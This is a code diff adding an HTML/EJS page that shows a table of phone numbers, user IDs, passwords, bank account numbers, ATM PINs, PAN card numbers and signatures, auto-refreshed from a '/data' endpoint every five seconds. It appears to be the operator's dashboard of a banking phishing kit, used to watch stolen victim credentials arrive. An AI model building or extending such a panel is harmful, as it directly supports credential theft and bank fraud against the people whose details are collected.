@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/daisyui@3.2.1/dist/full.css"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body>
+    <div class="p-10 flex justify-content items-center w-full">
+      <div class="overflow-x-auto p-5">
+        <table class="table">
+          <thead>
+            <tr>
+              <th></th>
+              <th>Phone</th>
+              <th>User ID</th>
+              <th>Password</th>
+              <th>Account No</th>
+              <th>ATM PIN</th>
+              <th>Pan Card</th>
+              <th>Signature</th>
+            </tr>
+          </thead>
+          <tbody id="data-table-body">
+            <% for (let i = 0; i < data.length; i++) { %>
+            <tr>
+              <td><%= i + 1 %></td>
+              <td><%= data[i].phone %></td>
+              <td><%= data[i].user_id %></td>
+              <td><%= data[i].password %></td>
+              <td><%= data[i].account_no %></td>
+              <td><%= data[i].atm_pin %></td>
+              <td><%= data[i].pan_card %></td>
+              <td><%= data[i].signature %></td>
+            </tr>
+            <% } %>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <script>
+      function refreshData() {
+        fetch("/data")
+          .then((response) => response.json())
+          .then((data) => {
+            const tableBody = document.getElementById("data-table-body");
+            tableBody.innerHTML = "";
+
+            data.forEach((item, index) => {
+              const row = document.createElement("tr");
+
+              const cellIndex = document.createElement("td");
+              cellIndex.innerText = index + 1;
+              row.appendChild(cellIndex);
+
+              const cellPhone = document.createElement("td");
+              cellPhone.innerText = item.phone;
+              row.appendChild(cellPhone);
+
+              const cellUserId = document.createElement("td");
+              cellUserId.innerText = item.user_id;
+              row.appendChild(cellUserId);
+
+              const cellPassword = document.createElement("td");
+              cellPassword.innerText = item.password;
+              row.appendChild(cellPassword);
+
+              const cellAccountNo = document.createElement("td");
+              cellAccountNo.innerText = item.account_no;
+              row.appendChild(cellAccountNo);
+
+              const cellAtmPin = document.createElement("td");
+              cellAtmPin.innerText = item.atm_pin;
+              row.appendChild(cellAtmPin);
+
+              const cellPanCard = document.createElement("td");
+              cellPanCard.innerText = item.pan_card;
+              row.appendChild(cellPanCard);
+
+              const cellSignature = document.createElement("td");
+              cellSignature.innerText = item.signature;
+              row.appendChild(cellSignature);
+
+              tableBody.appendChild(row);
+            });
+          })
+          .catch((error) => {
+            console.error("Error fetching data:", error);
+          });
+      }
+
+      setInterval(refreshData, 5000);
+    </script>
+  </body>
+</html>
